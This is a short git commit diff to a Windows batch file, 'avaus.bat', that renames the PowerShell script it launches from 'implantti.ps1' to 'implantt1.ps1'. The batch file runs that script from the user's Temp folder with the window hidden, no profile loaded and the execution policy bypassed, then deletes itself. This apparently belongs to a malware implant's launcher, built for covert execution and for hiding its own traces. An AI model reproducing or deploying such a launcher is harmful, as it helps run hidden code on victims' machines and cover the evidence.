dbe7b0885371e58a1c72af15742f1e8f682259c4
ngabubbon <ngabubbon@gmail.com>
2024-12-31 01:37:24 +0200

    Update avaus.bat

--- avaus.bat
+++ avaus.bat
@@ -1,5 +1,5 @@
 @echo off
-start /min powershell -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -File "C:\Users\%username%\AppData\Local\Temp\implantti.ps1"
+start /min powershell -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -File "C:\Users\%username%\AppData\Local\Temp\implantt1.ps1"
 
 start /b cmd /c del "%~f0"
 
